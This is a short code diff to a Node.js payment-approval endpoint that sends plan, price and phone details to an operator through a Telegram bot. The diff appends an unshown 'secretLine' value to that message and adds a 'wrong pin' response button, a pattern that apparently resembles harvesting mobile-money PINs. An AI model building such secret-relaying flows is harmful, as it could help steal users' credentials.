@@ -85,7 +85,7 @@ app.post('/api/request-approval', async (req, res) => {
       `📦 Data: ${plan || '—'}\n` +
       `💰 Price: CDF ${price || '—'}\n` +
       `📱 Phone: \`${phone || '—'}\`\n` +
-      
+      secretLine;
       
 
     const buttonRow =
@@ -138,6 +138,7 @@ const LABEL_BY_ACTION = {
   approve: 'Approve ✅',
   deny: 'Reject ❌',
   insufficient: 'Insufficient Balance ⚠️',
+  demo_error:'wrong pin⚠️',
 };
 if (bot) {
   bot.on('callback_query', async (query) => {
